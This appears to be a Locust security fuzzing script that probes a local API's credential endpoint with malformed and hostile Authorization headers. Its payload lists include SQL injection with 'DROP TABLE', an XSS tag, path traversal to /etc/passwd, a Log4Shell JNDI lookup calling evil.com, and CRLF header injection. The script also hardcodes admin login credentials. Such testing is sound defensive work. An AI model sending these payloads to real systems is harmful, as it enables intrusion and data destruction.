import json
import logging
from locust import HttpUser, task, SequentialTaskSet, constant

log = logging.getLogger(__name__)

class AuthBypassFuzz(SequentialTaskSet):

    def on_start(self):
        """Get authentication token"""
        payload = {"username": "admin", "password": "admin123"}
        response = self.client.post("/api/v3/login", json=payload, verify=False, catch_response=True)
        self.valid_token = "fake_token" if response.status_code != 200 else response.json()["access_token"]

    @task
    def fuzz_invalid_auth_tokens(self):
        """Test various invalid authentication tokens"""

        malicious_tokens = [
            "Bearer fake_token",
            "Bearer ' OR '1'='1",
            "Bearer admin",
            "Bearer null",
            "Bearer undefined",
            "Bearer <script>alert('xss')</script>",
            "Bearer ../../../etc/passwd",
            "Bearer ${jndi:ldap://evil.com/exploit}",
            "Basic YWRtaW46YWRtaW4=",  # admin:admin in base64
            "Bearer " + "A" * 1000,
            "",
            "InvalidScheme validtoken",
            "Bearer",
            None
        ]

        for token in malicious_tokens:
            if token is None:
                headers = {}
            else:
                headers = {"Authorization": token}

            credential_data = {
                "name": "test_cred",
                "username": "testuser",
                "password": "testpass",
                "type": "OS"
            }

            with self.client.post("/api/v3/raw-credentials",
                                  headers=headers,
                                  json=credential_data,
                                  verify=False,
                                  catch_response=True) as response:

                if response.status_code == 401:
                    response.success()
                    log.info(f"Auth properly rejected for token: {token}")
                elif response.status_code == 200:
                    log.warning(f"Auth bypassed with token: {token}")
                    response.success()
                else:
                    response.success()

    @task
    def fuzz_token_injection_attacks(self):
        """Test token injection and manipulation"""

        # Test SQL injection in tokens
        injection_tokens = [
            f"Bearer {self.valid_token}'; DROP TABLE sessions; --",
            f"Bearer {self.valid_token} OR 1=1",
            f"Bearer {self.valid_token}\"",
            f"Bearer {self.valid_token}';",
            f"Bearer {self.valid_token}%00"
        ]

        for token in injection_tokens:
            headers = {"Authorization": token}

            with self.client.get("/api/v3/raw-credentials",
                                 headers=headers,
                                 verify=False,
                                 catch_response=True) as response:

                if response.status_code == 401:
                    response.success()
                    log.info(f"Token injection properly rejected: {token}")
                elif response.status_code == 200:
                    log.warning(f"Potential token injection vulnerability: {token}")
                    response.success()
                else:
                    response.success()

    @task
    def fuzz_authorization_header_manipulation(self):
        """Test Authorization header manipulation"""

        # Multiple authorization headers
        malicious_headers = [
            {"Authorization": f"Bearer {self.valid_token}", "Authorization2": "Bearer admin"},
            {"authorization": f"Bearer {self.valid_token}"},  # lowercase
            {"AUTHORIZATION": f"Bearer {self.valid_token}"},  # uppercase
            {"X-Authorization": f"Bearer {self.valid_token}"},
            {"Authorization": f"Bearer {self.valid_token}", "X-Real-IP": "127.0.0.1"},
            {"Authorization": f"Bearer {self.valid_token}\r\nX-Injected: malicious"}
        ]

        for headers in malicious_headers:
            with self.client.get("/api/v3/raw-credentials",
                                 headers=headers,
                                 verify=False,
                                 catch_response=True) as response:

                if response.status_code in [200, 401]:
                    response.success()
                    log.info(f"Header manipulation test completed: {headers}")
                else:
                    response.success()

class AuthBypassUser(HttpUser):
    wait_time = constant(1)
    tasks = [AuthBypassFuzz]
    host = "https://localhost:8443"
